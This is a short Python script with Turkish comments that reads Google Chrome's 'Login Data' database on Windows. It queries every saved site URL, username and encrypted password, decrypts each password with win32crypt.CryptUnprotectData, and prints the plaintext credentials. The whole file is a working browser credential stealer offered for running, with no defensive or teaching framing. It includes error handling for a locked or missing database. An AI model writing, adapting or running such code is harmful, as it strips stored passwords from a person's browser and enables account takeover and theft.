import os,sys,sqlite3,win32crypt


PathName = (os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\') # chrome data yolu
FileName = ('Login Data') # chrome şifrelerin ve cookielerin tutulduğu dosya sqlite veritabani
def browser():
	value_list = []
	try: # hata yakalamak için kullanıyoruz.
		connect = sqlite3.connect(PathName+FileName) # sqlite3 kütüphanesini kullanarak veritabanını açıyoruz
		with connect:
			cursor = connect.cursor() # sqlite bağlanıyoruz.
			sql = cursor.execute('SELECT origin_url, username_value, password_value FROM logins') # sql query ile verileri çekiyoruz.
			values = sql.fetchall()
		for value in values: # for ile values içinde gezip her bir değere value diyoruz.
			password = win32crypt.CryptUnprotectData(value[2], None, None, None, 0)[1] # şifreli veriyi kırıp password değişkenine gönderiyoruz
			value_list.append({
				'url':value[0], # value'nin ilk değeri
				'username':value[1], # value'nin ikinci değeri
				'password':str(password) # kırılmış şifre
				})
	
	#Yakaladığımız hataları bildiriyoruz.

	except sqlite3.OperationalError as err:
		err = str(err)
		if (err == 'database is locked'):
			print("[!] Chrome Arka planda Aktif")
			sys.exit(0)
		elif (err == 'no such table: logins'):
			print("[!] Veritabaninda logins adinda tablo bulunamadi")
			sys.exit(0)
		elif (err == 'unable to open database file'):
			print("[!] Veritabani yolu hatali veya izin yok")
			sys.exit(0)
		else:
			print(err)
			sys.exit(0)
	print(value_list) # yaz
browser() # çalıştır

